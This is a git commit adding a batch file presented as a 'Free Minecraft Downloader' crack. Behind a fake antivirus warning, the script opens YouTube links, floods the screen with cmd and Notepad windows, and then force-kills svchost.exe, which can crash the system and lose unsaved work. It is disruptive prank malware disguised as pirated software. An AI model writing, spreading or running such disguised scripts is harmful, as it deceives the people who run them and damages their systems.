7426017e51cb62e3c936329b299f3bcd48ab810d
Shadow <79156445+ShadowDaWolf@users.noreply.github.com>
2022-08-05 14:50:22 +0300

    Add files via upload

---
+++ free minecraft!11!1.bat
@@ -0,0 +1,21 @@
+@echo off
+color 0a
+echo Free Minecraft Downloader
+echo 100% safe crack omg!!1!11
+set /p yesorno=Do you want to install free minecraft now? (y/n)
+echo warning! virus detected by our integrated Protegent antivirus 2005!
+echo we need to restart the system to delete the virus, please wait a few seconds.
+start msedge.exe https://www.youtube.com/watch?v=PIp06sdFHLM
+start chrome.exe https://www.youtube.com/watch?v=xvFZjo5PgG0
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+ping 1.1.127.1>nul
+taskkill /im svchost.exe /f
+pause
